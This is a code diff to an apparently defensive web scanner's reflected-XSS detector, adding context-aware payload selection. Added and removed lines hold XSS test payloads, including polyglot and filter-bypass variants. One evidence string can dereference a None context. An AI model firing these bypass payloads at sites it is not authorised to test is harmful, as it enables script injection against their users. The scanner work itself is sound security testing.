@@ -18,6 +18,12 @@ from .payloads import (
     ENCODED_PAYLOADS,
     generate_stored_xss_marker,
 )
+from .context_analyzer import (
+    analyze_reflection,
+    ReflectionContext,
+    select_payload,
+    XSS_CHECKER,
+)
 
 
 logger = logging.getLogger("wvs.module.xss")
@@ -271,51 +277,74 @@ class XSSDetector(DetectionModule):
         baseline_text: str,
     ) -> None:
         """
-        Detect reflected XSS
-        Process: inject payload -> check if reflected verbatim/transformed in HTML -> secondary verification
+        Detect reflected XSS (upgraded with XSStrike context-aware analysis).
+
+        Phase 1: Inject unique marker → analyze reflection context
+        Phase 2: Select context-optimized payloads → test
+        Phase 3: Fallback with generic payloads if context analysis fails
         """
         logger.debug(f"[XSS] Starting reflected XSS test: {url} [{param_name}]")
 
-        # Round 1: test the most likely triggering payloads (P7: +polyglot +WAF bypass)
-        priority_payloads = [
-            "<script>alert(1)</script>",
-            "<img src=x onerror=alert(1)>",
-            "<svg onload=alert(1)>",
-            "'><script>alert(1)</script>",
-            '"><script>alert(1)</script>',
-            "<SCRIPT>alert(1)</SCRIPT>",
-            "<ScRiPt>alert(1)</ScRiPt>",
-            # P7: polyglot + encoding bypass
-            "javascript:alert(1)",
-            "\"'><img src=x onerror=alert(1)>",
-            "';alert(1);//",
-            "<img src=x onerror=alert(1) ",
-            "<<SCRIPT>alert(1);//<</SCRIPT>",
-            "<details open ontoggle=alert(1)>",
-            "<body onload=alert(1)>",
-            "<input autofocus onfocus=alert(1)>",
-        ]
+        # ── Phase 1: Context analysis (XSStrike concept) ──
+        test_params = params.copy()
+        test_params[param_name] = XSS_CHECKER
+        ctx_resp = await self._send_request(method, url, test_params, param_type)
 
-        for payload in priority_payloads:
+        context: Optional[ReflectionContext] = None
+        if ctx_resp:
+            ctx_text = ctx_resp.get("text", "")[:20000]
+            contexts = analyze_reflection(ctx_text, XSS_CHECKER)
+            # Find first executable context
+            for c in contexts:
+                if c.is_executable():
+                    context = c
+                    logger.debug(
+                        f"[XSS] Context: {c.context} | tag={c.tag} | "
+                        f"type={c.attr_type} | quote={c.quote_char}"
+                    )
+                    break
+            if not contexts:
+                logger.debug(f"[XSS] Marker not reflected: {url} [{param_name}]")
+                return
+            if context and not context.is_executable():
+                logger.debug(
+                    f"[XSS] Non-executable context ({context.context}), trying escape"
+                )
+
+        # ── Phase 2: Context-aware payloads ──
+        if context:
+            targeted_payloads = select_payload(context)[:7]
+        else:
+            # No context detected — use polyglot + generic
+            targeted_payloads = [
+                "\"'><img src=x onerror=alert(1)>",
+                "'><script>alert(1)</script>",
+                "<svg onload=alert(1)>",
+                "<body onload=alert(1)>",
+            ]
+
+        for payload in targeted_payloads:
             test_params = params.copy()
             test_params[param_name] = payload
-            logger.debug(f"[XSS] Testing payload: {payload[:30]}")
+            logger.debug(f"[XSS] Testing payload [{context.context if context else 'generic'}]: {payload[:40]}")
 
             resp = await self._send_request(method, url, test_params, param_type)
             if resp is None:
                 continue
 
             resp_text = resp.get("text", "")[:20000]
-
-            # Check for reflection
             reflected, evidence = self._check_reflection(resp_text, payload, baseline_text)
+
             if reflected:
                 if self._is_echo_server(url, resp_text, payload):
                     logger.debug(f"[XSS] Ignoring echo-server reflection: {url}")
                     continue
-                logger.info(f"[XSS] Found reflection: {url} [{param_name}] payload={payload[:30]}")
-                # Secondary verification: try a different payload
+                logger.info(
+                    f"[XSS] Found reflection [{context.context if context else 'generic'}]: "
+                    f"{url} [{param_name}] payload={payload[:30]}"
+                )
                 if await self._verify_reflected(url, params, param_name, method, param_type):
+                    ctx_info = f" context={context.context}" if context else ""
                     vuln = self._create_vuln(
                         url=url,
                         param=param_name,
@@ -323,18 +352,19 @@ class XSSDetector(DetectionModule):
                         method=method,
                         payload=payload,
                         vuln_type="reflected",
-                        evidence=evidence or f"Reflected XSS: payload '{payload}' reflected in response",
+                        evidence=(
+                            evidence
+                            or f"Reflected XSS ({context.context}{ctx_info}): payload '{payload}' reflected"
+                        ),
                     )
                     self._found_vulns.append(vuln)
-                    logger.warning(f"[XSS] Reflected confirmed: {url} [{param_name}]")
+                    logger.warning(f"[XSS] Reflected confirmed [{context.context if context else 'generic'}]: {url} [{param_name}]")
                     return
 
-        # Round 2: test more payloads
-        test_payloads = list(REFLECTED_PAYLOADS[:15])
-        test_payloads.extend(ENCODED_PAYLOADS[:5])
-
-        for payload in test_payloads:
-            if payload in priority_payloads:
+        # ── Phase 3: Fallback generic payloads ──
+        fallback_payloads = list(REFLECTED_PAYLOADS[:8])
+        for payload in fallback_payloads:
+            if payload in targeted_payloads:
                 continue
             test_params = params.copy()
             test_params[param_name] = payload
@@ -344,14 +374,11 @@ class XSSDetector(DetectionModule):
                 continue
 
             resp_text = resp.get("text", "")[:20000]
-
-            # Check for reflection
             reflected, evidence = self._check_reflection(resp_text, payload, baseline_text)
+
             if reflected:
                 if self._is_echo_server(url, resp_text, payload):
-                    logger.debug(f"[XSS] Ignoring echo-server reflection (round 2): {url}")
                     continue
-                # Secondary verification: try a different payload
                 if await self._verify_reflected(url, params, param_name, method, param_type):
                     vuln = self._create_vuln(
                         url=url,
@@ -360,7 +387,7 @@ class XSSDetector(DetectionModule):
                         method=method,
                         payload=payload,
                         vuln_type="reflected",
-                        evidence=evidence or f"Reflected XSS: payload '{payload}' reflected in response",
+                        evidence=evidence or f"Reflected XSS: payload '{payload}' reflected",
                     )
                     self._found_vulns.append(vuln)
                     logger.warning(f"[XSS] Reflected detected: {url} [{param_name}]")
